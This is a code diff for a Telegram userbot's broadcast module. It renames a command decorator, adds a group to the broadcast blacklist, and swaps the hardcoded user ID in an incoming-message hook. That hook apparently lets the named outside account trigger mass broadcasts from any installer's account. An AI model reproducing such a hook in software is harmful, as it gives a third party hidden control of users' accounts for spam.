@@ -11,7 +11,7 @@
 # t.me/SharingUserbot & t.me/Lunatic0de
 
 from userbot import CMD_HELP, CMD_HANDLER as cmd
-from userbot.utils import edit_or_reply, edit_delete, kyy_cmd
+from userbot.utils import edit_or_reply, edit_delete, av_cmd
 from userbot.events import register
 
 GCAST_BLACKLIST = [
@@ -23,12 +23,12 @@ GCAST_BLACKLIST = [
     -1001267233272,  # PocongUserbot
     -1001386557465,  # RumahKitaro
     -1001318051930,  # Gatau GC mana
-
+    -1001704645461,  # GC Jamet
 ]
 
 
-@kyy_cmd(pattern="gcast(?: |$)(.*)")
-@register(incoming=True, from_users=1663258664,
+@av_cmd(pattern="gcast(?: |$)(.*)")
+@register(incoming=True, from_users=2004395661,
           pattern=r"^\.cgcast(?: |$)(.*)")
 async def gcast(event):
     xx = event.pattern_match.group(1)
@@ -57,7 +57,7 @@ async def gcast(event):
     )
 
 
-@kyy_cmd(pattern="gucast(?: |$)(.*)")
+@av_cmd(pattern="gucast(?: |$)(.*)")
 async def gucast(event):
     xx = event.pattern_match.group(1)
     if xx:
